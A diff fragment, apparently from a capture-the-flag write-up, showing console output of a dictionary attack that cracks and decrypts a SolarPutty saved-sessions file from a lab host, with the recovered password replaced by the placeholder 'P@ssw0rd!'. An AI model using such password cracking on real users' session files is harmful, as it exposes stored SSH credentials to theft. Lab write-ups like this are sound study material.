@@ -11,10 +11,10 @@ exploit2.py for a dictionary attack:
 SolarPutty's Sessions Decrypter (Python Version)
 -----------------------------------------------------
 File content (first 50 bytes): b'ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJw'
-Trying password: estrellaal
+Trying password: P@ssw0rd!
 Potential successful decryption with password: P@ssw0rd!
 Decrypted content (first 200 bytes):
 b'\xacuY\xff\x11\xfbD\xba\xb3\xe2\xc8\x80pB\xbe\xceU\xed;\x8f)\x10\xb5Ins":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b'
 
-[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted_estrella.bin
+[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted_P@ssw0rd!.bin
 Continue trying other passwords? (y/n): n
